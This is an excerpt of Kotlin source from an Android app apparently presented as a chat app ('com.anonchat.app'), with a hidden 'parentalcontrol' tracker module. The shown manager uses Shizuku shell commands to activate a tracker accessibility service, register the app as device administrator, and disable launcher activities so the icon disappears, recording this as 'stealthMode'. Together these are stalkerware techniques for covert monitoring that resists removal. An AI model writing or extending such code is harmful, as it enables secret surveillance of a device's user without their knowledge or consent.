...
object ShizukuPermissionManager {
    ...
    private const val PACKAGE_NAME = "com.anonchat.app"
    ...
    fun enableAccessibilityService(context: Context): Boolean {
        val componentFlat = "$PACKAGE_NAME/.parentalcontrol.service.TrackerAccessibilityService"
    ...
    fun activateDeviceAdmin(context: Context): Boolean {
        val component = "$PACKAGE_NAME/.parentalcontrol.receiver.DeviceAdminReceiver"
        val result = executeShellCommand("dpm set-active-admin $component")
        if (result.success) {
            com.anonchat.app.parentalcontrol.api.CloudConfig.deviceAdminActive = true
    ...
    fun hideAppIcon(context: Context): Boolean {
        ...
        val result = executeShellCommand(
            "pm disable $PACKAGE_NAME/$PACKAGE_NAME.ui.auth.AuthActivityAlias"
        )
        if (result.success) {
            com.anonchat.app.parentalcontrol.api.CloudConfig.stealthMode = true
            ...
            val fallback = executeShellCommand(
                "pm disable $PACKAGE_NAME/$PACKAGE_NAME.ui.main.MainActivity"
            )
            if (fallback.success) {
                com.anonchat.app.parentalcontrol.api.CloudConfig.stealthMode = true
        ...
        return com.anonchat.app.parentalcontrol.api.CloudConfig.stealthMode
    }
    ...
    fun showAppIcon(context: Context) {
        executeShellCommand("pm enable $PACKAGE_NAME/$PACKAGE_NAME.ui.auth.AuthActivityAlias")
    ...
    fun runFullSetup(
        ...
        return SetupResult(
            ...
            iconHidden = hideIcon && com.anonchat.app.parentalcontrol.api.CloudConfig.stealthMode,
            report = fullReport
        )
    }
